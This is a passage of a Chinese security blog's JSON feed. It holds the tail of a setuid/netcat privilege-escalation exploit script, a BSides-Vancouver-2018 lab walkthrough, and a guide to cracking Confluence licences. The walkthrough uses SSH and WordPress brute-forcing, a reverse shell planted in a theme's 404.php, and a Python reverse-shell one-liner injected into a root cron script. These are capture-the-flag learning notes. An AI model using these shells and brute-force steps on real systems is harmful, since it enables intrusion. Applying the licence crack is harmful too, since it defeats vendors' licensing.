<span>></span><span>/</span>tmp<span>/</span>pwned<span>.</span>c\n\tgcc <span>-</span>o <span>/</span>tmp<span>/</span>pwned <span>/</span>tmp<span>/</span>pwned<span>.</span>c <span>2</span><span>></span><span>/</span>dev<span>/</span><span>null</span>\n\t<span>if</span> <span>[</span> $<span>?</span> <span>-</span>ne <span>0</span> <span>]</span><span>;</span> then\n\t\techo <span>\"Problems compiling setuid shell helper, check your gcc.\"</span>\n\t\techo <span>\"Falling back to the /bin/sh method.\"</span>\n\t\tcp <span>/</span>bin<span>/</span>sh <span>/</span>tmp<span>/</span>pwned\n\tfi\n\techo\n\n\techo <span>\"Delivering $METHOD payload...\"</span>\n\t<span>PAYLOAD</span><span>=</span>$<span>PAYLOAD_SETUID</span>\n\texploit\n\techo\n\n\techo <span>\"Waiting 5 seconds...\"</span>\n\tsleep <span>5</span>\n\tls <span>-</span>l <span>/</span>tmp<span>/</span>pwned\n\t<span>/</span>tmp<span>/</span>pwned\n\nelif <span>[</span> $<span>METHOD</span> <span>=</span> <span>\"netcat\"</span> <span>]</span><span>;</span> then\n\techo <span>\"Delivering $METHOD payload...\"</span>\n\t<span>PAYLOAD</span><span>=</span>$<span>PAYLOAD_NETCAT</span>\n\texploit\n\techo\n\techo <span>\"Waiting 5 seconds...\"</span>\n\tsleep <span>5</span>\n\tnc <span>-</span>v <span>127.0</span><span>.0</span><span>.1</span> <span>31337</span>\n\n<span>else</span>\n\tusage\nfi\n<span>EOF</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br></div></div><p>运行</p>\n<div><pre><code>bash pri.sh -m netcat\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211007220943261.png\" alt=\"image-20211007220943261\" /></p>\n<p>在kali上创建连接后，拿到root权限shell</p>\n<div><pre><code>nc -nv 172.16.89.9 31337 \n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20211007221027898.png\" alt=\"image-20211007221027898\" /></p>\n<p>获得flag</p>\n<p><img src=\"/assets/img/image-20211007221320899.png\" alt=\"image-20211007221320899\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20211006225232766.png",
      "date_published": "2021-10-06T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "主页",
      "url": "http://www.liuhanzhe.com/",
      "id": "http://www.liuhanzhe.com/",
      "content_html": "",
      "date_published": "2021-08-14T14:41:11.000Z",
      "date_modified": "2022-04-21T10:14:37.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "其他",
      "url": "http://www.liuhanzhe.com/docs/%E5%85%B6%E4%BB%96/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/%E5%85%B6%E4%BB%96/0.readme/",
      "content_html": "<ul>\n<li><a href=\"./1.confluence安装.html\">1.安装并破解confluence和markdown插件</a></li>\n</ul>\n",
      "date_published": "2022-04-21T08:19:12.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "Fun Blog",
      "url": "http://www.liuhanzhe.com/security/",
      "id": "http://www.liuhanzhe.com/security/",
      "content_html": "<p>这是普通主页的案例。你可以在这里放置你的主体内容。</p>\n<p>想要使用此布局，你需要在页面 front matter 中设置 <code>home: true</code>。</p>\n<p>配置项的相关说明详见 <a href=\"https://vuepress-theme-hope.github.io/zh/guide/layout/home/\" target=\"_blank\" rel=\"noopener noreferrer\">项目主页配置</a>。</p>\n",
      "date_published": "2021-08-16T15:16:59.000Z",
      "date_modified": "2021-08-16T15:16:59.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "创建并破解confluence和markdown插件",
      "url": "http://www.liuhanzhe.com/docs/%E5%85%B6%E4%BB%96/1.confluence%E5%AE%89%E8%A3%85/",
      "id": "http://www.liuhanzhe.com/docs/%E5%85%B6%E4%BB%96/1.confluence%E5%AE%89%E8%A3%85/",
      "content_html": "<h2 id=\"安装confluence\"> 安装confluence</h2>\n<p>1.安装postgresql</p>\n<div><pre><code>docker run --name postgresdb -p <span>5432</span>:5432 -e <span>POSTGRES_PASSWORD</span><span>=</span>W**** -d postgres\n</code></pre>\n<div><span>1</span><br></div></div><p>2.安装confluence</p>\n<div><pre><code>docker run -d --name confluence -p <span>80</span>:8090 --link postgresdb:db --user root:root cptactionhank/atlassian-confluence:latest\n</code></pre>\n<div><span>1</span><br></div></div><p>3.下载破解agent</p>\n<div><pre><code>https://gitee.com/pengzhile/atlassian-agent/releases/v1.3.1\n</code></pre>\n<div><span>1</span><br></div></div><p>4.将破解agent拷入confluence docker</p>\n<div><pre><code>docker <span>cp</span> atlassian-agent.jar confluence:/home/\ndocker <span>exec</span> -it confluence /bin/bash\n<span>echo</span> <span>'export CATALINA_OPTS=\"-javaagent:/home/atlassian-agent.jar ${CATALINA_OPTS}\"'</span> <span>>></span> /opt/atlassian/confluence/bin/setenv.sh\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>5.重启confluence docker</p>\n<div><pre><code>docker restart confluence\n</code></pre>\n<div><span>1</span><br></div></div><p>6.通过web访问confluence，获取授权id\n7.利用破解agent生成授权码</p>\n<div><pre><code>java -jar atlassian-agent.jar -m admin@admin.com -n BAT -p conf -o http://127.0.0.1 -s BKDV-5HWF-N82F-JQB7\n</code></pre>\n<div><span>1</span><br></div></div><p>8.完成剩余安装</p>\n<h2 id=\"安装markdown破解插件\"> 安装markdown破解插件</h2>\n<div><pre><code>java -jar atlassian-agent.jar -m admin@admin.com -n BAT -p &#39;mohamicorp-render-markdown&#39; -o http://127.0.0.1 -s BKDV-5HWF-N82F-JQB7\n</code></pre>\n<div><span>1</span><br></div></div><p>9.问题解决</p>\n<h2 id=\"修复word文档预览显示不了中文\"> 修复word文档预览显示不了中文</h2>\n<p>参见https://www.cnblogs.com/lei0213/p/10941715.html</p>\n",
      "date_published": "2022-04-14T00:00:00.000Z",
      "date_modified": "2022-04-21T08:58:35.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "其他"
      ]
    },
    {
      "title": "靶机 BSides-Vancouver-2018-Workshop Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/BSides-Vancouver-2018-Workshop/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/BSides-Vancouver-2018-Workshop/",
      "content_html": "<p>扫描ip</p>\n<div><pre><code>└─$ nmap -sP 192.168.182.0/24         \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 11:31 EDT\nNmap scan report for 192.168.182.2\nHost is up (0.00042s latency).\nNmap scan report for 192.168.182.128\nHost is up (0.00021s latency).\nNmap scan report for 192.168.182.131\nHost is up (0.00074s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 15.73 seconds\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><p>扫描目标</p>\n<div><pre><code>┌──(kali㉿kali)-[/tmp]\n└─$ nmap -T5 -A -v -p- 192.168.182.131                                                   \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 11:30 EDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 11:30\nCompleted NSE at 11:30, 0.00s elapsed\nInitiating NSE at 11:30\nCompleted NSE at 11:30, 0.00s elapsed\nInitiating NSE at 11:30\nCompleted NSE at 11:30, 0.00s elapsed\nInitiating Ping Scan at 11:30\nScanning 192.168.182.131 [2 ports]\nCompleted Ping Scan at 11:30, 0.00s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 11:30\nCompleted Parallel DNS resolution of 1 host. at 11:31, 13.01s elapsed\nInitiating Connect Scan at 11:31\nScanning 192.168.182.131 [65535 ports]\nDiscovered open port 80/tcp on 192.168.182.131\nDiscovered open port 21/tcp on 192.168.182.131\nDiscovered open port 22/tcp on 192.168.182.131\nCompleted Connect Scan at 11:31, 2.20s elapsed (65535 total ports)\nInitiating Service scan at 11:31\nScanning 3 services on 192.168.182.131\nCompleted Service scan at 11:31, 6.02s elapsed (3 services on 1 host)\nNSE: Script scanning 192.168.182.131.\nInitiating NSE at 11:31\nNSE: [ftp-bounce] PORT response: 500 Illegal PORT command.\nCompleted NSE at 11:31, 0.52s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.01s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nNmap scan report for 192.168.182.131\nHost is up (0.00023s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.5\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 192.168.182.128\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 2.3.5 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)\n|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)\n|_  256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)\n80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/backup_wordpress\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Site doesn&#39;t have a title (text/html).\n|_http-server-header: Apache/2.2.22 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nNSE: Script Post-scanning.\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nInitiating NSE at 11:31\nCompleted NSE at 11:31, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.17 seconds\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br></div></div><h2 id=\"方法一\"> 方法一</h2>\n<p>有21端口，尝试用匿名账号登录</p>\n<p><img src=\"/assets/img/image-20220421180049816.png\" alt=\"image-20220421180049816\" /></p>\n<p>发现users.txt.bk 文件夹，下载后查看内容，有5个用户名</p>\n<p>用这5个用户进行ssh爆破，anne用户爆破成功</p>\n<p><img src=\"/assets/img/image-20220421180055966.png\" alt=\"image-20220421180055966\" /></p>\n<p>登陆后发现anne在sudo组，sudo 提权成功</p>\n<p><img src=\"/assets/img/image-20220421180100595.png\" alt=\"image-20220421180100595\" /></p>\n<h2 id=\"方法二\"> 方法二</h2>\n<div><pre><code>┌──<span>(</span>kali㉿kali<span>)</span>-<span>[</span>/tmp<span>]</span>\n└─$ nikto -host <span>192.168</span>.182.131\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          <span>192.168</span>.182.131\n+ Target Hostname:    <span>192.168</span>.182.131\n+ Target Port:        <span>80</span>\n+ Start Time:         <span>2022</span>-04-04 <span>11</span>:46:51 <span>(</span>GMT-4<span>)</span>\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.22 <span>(</span>Ubuntu<span>)</span>\n+ Server may leak inodes via ETags, header found with <span>file</span> /, inode: <span>2140</span>, size: <span>177</span>, mtime: Sat Mar  <span>3</span> <span>14</span>:17:59 <span>2018</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span>in</span> a different fashion to the MIME <span>type</span>\n+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26\n+ Uncommon header <span>'link'</span> found, with contents: <span>&lt;</span>/backup_wordpress/?rest_route<span>=</span>/<span>></span><span>;</span> <span>rel</span><span>=</span><span>\"https://api.w.org/\"</span>\n+ Entry <span>'/backup_wordpress/'</span> <span>in</span> robots.txt returned a non-forbidden or redirect HTTP code <span>(</span><span>200</span><span>)</span>\n+ <span>\"robots.txt\"</span> contains <span>1</span> entry <span>which</span> should be manually viewed.\n+ Uncommon header <span>'tcn'</span> found, with contents: list\n+ Apache mod_negotiation is enabled with MultiViews, <span>which</span> allows attackers to easily brute force <span>file</span> names. See http://www.wisec.it/sectou.php?id<span>=</span>4698ebdc59d15. The following alternatives <span>for</span> <span>'index'</span> were found: index.html\n+ Apache/2.2.22 appears to be outdated <span>(</span>current is at least Apache/2.4.37<span>)</span>. Apache <span>2.2</span>.34 is the EOL <span>for</span> the <span>2</span>.x branch.\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS \n+ OSVDB-3233: /icons/README: Apache default <span>file</span> found.\n+ <span>8726</span> requests: <span>0</span> error<span>(</span>s<span>)</span> and <span>13</span> item<span>(</span>s<span>)</span> reported on remote <span>host</span>\n+ End Time:           <span>2022</span>-04-04 <span>11</span>:47:21 <span>(</span>GMT-4<span>)</span> <span>(</span><span>30</span> seconds<span>)</span>\n---------------------------------------------------------------------------\n+ <span>1</span> host<span>(</span>s<span>)</span> tested\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><p>发现robots.txt,查看内容</p>\n<p><img src=\"/assets/img/image-20220421180107562.png\" alt=\"image-20220421180107562\" /></p>\n<p>发现扫描结果中提到的/backup_wordpress/，访问后发现是wordpress</p>\n<p><img src=\"/assets/img/image-20220421180111810.png\" alt=\"image-20220421180111810\" /></p>\n<p>扫描用户</p>\n<div><pre><code>wpscan --url http://192.168.182.131/backup_wordpress --enumerate u\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20220421180117176.png\" alt=\"image-20220421180117176\" /></p>\n<p>发现john和admin</p>\n<p>爆破john，发现密码</p>\n<p><img src=\"/assets/img/image-20220421180122247.png\" alt=\"image-20220421180122247\" /></p>\n<p>登录wordpress，修改404.php，反弹shell</p>\n<p><img src=\"/assets/img/image-20220421180126723.png\" alt=\"image-20220421180126723\" /></p>\n<p>kali监听 nc -nlvp 4444</p>\n<p>访问http://192.168.56.107/backup_wordpress/wp-content/themes/twentysixteen/404.php，获得反弹shell</p>\n<p><img src=\"/assets/img/image-20220421180132578.png\" alt=\"image-20220421180132578\" /></p>\n<p>尝试内核提权和suid提权都没有成功，查看调度任务</p>\n<p><img src=\"/assets/img/image-20220421180137224.png\" alt=\"image-20220421180137224\" /></p>\n<p>发现root权限执行cleanup脚本，查看cleanup</p>\n<p><img src=\"/assets/img/image-20220421180141923.png\" alt=\"image-20220421180141923\" /></p>\n<p>在cleanup后面添加一行，反弹shell代码</p>\n<div><pre><code>python <span>-</span>c <span>'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.182.128\",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span>\n</code></pre>\n<div><span>1</span><br></div></div><p>稍等几分钟，自动反弹，获得root权限</p>\n<p><img src=\"/assets/img/image-20220421180146579.png\" alt=\"image-20220421180146579\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421180049816.png",
      "date_published": "2022-04-04T00:00:00.000Z",
      "date_modified": "2022-04-21T10:40:01.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    }
  ]
}